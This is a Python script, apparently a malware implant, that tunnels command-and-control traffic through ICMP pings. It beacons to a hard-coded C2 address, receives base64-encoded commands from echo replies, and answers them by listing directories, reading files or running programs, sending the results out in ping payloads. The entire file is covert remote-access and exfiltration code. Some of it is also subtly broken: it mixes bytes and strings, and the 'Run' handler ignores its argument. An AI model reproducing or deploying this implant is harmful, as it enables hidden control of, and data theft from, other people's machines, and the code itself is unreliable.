#!/usr/bin/python3

from scapy.all import *
from threading import Thread, Lock
from base64 import *
import subprocess
import time

rec_mutex=Lock()
c2_server="192.168.6.18"
command=""
msg=""

def send_res(content):
	try:
		ping_req=IP(dst=c2_server)/ICMP(type="echo-request")/b64encode(content.encode('ascii'))
		send(ping_req)
	
	except Exception as e:
		print(e)
	
def handle_cmd(msg):
	try:
		cmd_lst = msg.split()
		if(cmd_lst[0] == 'START'):
			valid = 0
			trailer = ""
			if(cmd_lst[1] == 'ls'):
				result = subprocess.run(['ls', cmd_lst[2]], stdout=subprocess.PIPE)
				raw = result.stdout
				trailer = " LS END"
				valid = 1
			elif(cmd_lst[1] == 'Send'):
				with open(cmd_lst[2], mode="rb") as bin_file:
					raw = bin_file.read()
				trailer = " FILE END"
				valid = 1
			elif(cmd_lst[1] == 'Run'):
				result = subprocess.run([cmd_lst[1]], stdout=subprocess.PIPE)
				raw = result.stdout
				trailer = " RUN END"
				valid = 1
			if(valid):
				send_res(raw + trailer)
	except Exception as e:
		print(e)			
			
def recieve_cmd():
	try:
		while True:
			rp = sniff(filter="icmp and icmp[0]=0", count=1)
			msg = b64decode(rp[0][Raw].load).decode('ascii')
			rec_mutex.acquire()
			handle_cmd(msg)
			rec_mutex.release()

	except KeyboardInterrupt:
		return
	except Exception as e:
		print(e)
		
def beacon(content):
	try:
		ping_req=IP(dst=c2_server)/ICMP(type="echo-request")/(b64encode(content.encode('ascii')))
		send(ping_req)
		time.sleep(10)
		
	except Exception as e:
		print(e)
def main():
	try:
		lt = Thread(target=recieve_cmd)
		lt.start()
	except:
		print("cant start response thread")
	
	try:
		content = 'READY END'
		while True:
			beacon(content)
			
	except KeyboardInterrupt:
		return
	except Exception as e:
		print(e)	
		
if __name__=="__main__":
	main()
